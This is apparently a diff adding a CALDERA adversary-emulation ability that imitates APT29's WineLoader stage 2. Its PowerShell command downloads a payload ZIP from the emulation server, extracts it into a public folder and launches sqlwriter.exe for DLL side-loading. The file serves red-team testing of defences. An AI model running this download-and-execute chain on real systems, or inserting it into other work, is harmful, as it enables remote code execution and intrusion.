@@ -1,0 +1,52 @@
+- id: wineloader-stage2-core
+  name: WineLoader Stage 2 – Core Loader
+  description: Payload extraction and DLL side-loading
+  tactic: execution
+  technique_id: T1574.002
+  technique_name: "DLL Side-Loading"
+  platforms:
+    windows:
+      psh:
+        command: |
+          $ErrorActionPreference = "Stop";
+          $workDir = "C:\Users\Public\Music\Work";
+          $zipPath = "$workDir\data.zip";
+
+          # 1. Create working directory
+          if (!(Test-Path $workDir)) { 
+              New-Item -ItemType Directory -Path $workDir -Force | Out-Null 
+          };
+
+          try {
+              # 2. Download payload via CALDERA API
+              # Using the /file/download endpoint with a file header
+              # instead of a direct URL
+              $headers = @{"file"="payload.zip"};
+              Invoke-WebRequest -Uri "#{server}/file/download" -Headers $headers -OutFile $zipPath -UseBasicParsing;
+
+              # 3. Verify and extract the payload
+              if (Test-Path $zipPath) {
+                  Expand-Archive -Path $zipPath -DestinationPath $workDir -Force;
+                  
+                  # 4. Execute payload (DLL side-loading)
+                  if (Test-Path "$workDir\sqlwriter.exe") {
+                      Set-Location $workDir;
+                      Start-Process ".\sqlwriter.exe";
+                      
+                      # Use a valid event ID to avoid eventcreate errors
+                      eventcreate /T INFORMATION /ID 999 /L APPLICATION /SO "WineLoader" /D "WineLoader Stage2 executed" | Out-Null;
+                      
+                      # This output is captured by the CALDERA parser
+                      Write-Output "stage2_executed";
+                  } else {
+                      Write-Error "sqlwriter.exe not found in ZIP";
+                      exit 1;
+                  }
+              }
+          } catch {
+              Write-Error $_.Exception.Message;
+              exit 1;
+          }
+        parsers:
+          plugins.stockpile.app.parsers.line:
+            - source: apt29.wineloader.status
